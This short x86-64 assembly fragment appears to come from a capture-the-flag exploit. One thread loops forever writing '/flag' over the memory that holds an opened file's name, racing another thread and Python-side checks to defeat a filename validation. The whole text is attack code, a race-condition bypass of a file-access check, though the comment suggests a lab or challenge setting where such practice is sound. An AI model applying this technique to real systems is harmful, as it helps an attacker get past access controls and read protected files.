[BITS 64]

; when woken up, this thread will just write to change the memory region where the name of the opened file is in /flag,
; "racing" against the other thread and the Python checks

nop
xor eax, eax
mov eax, 0x1002fc0; STACK
mov rbx, 0x67616c662f ; /flag

_loop:
mov qword [rax], rbx
jmp _loop


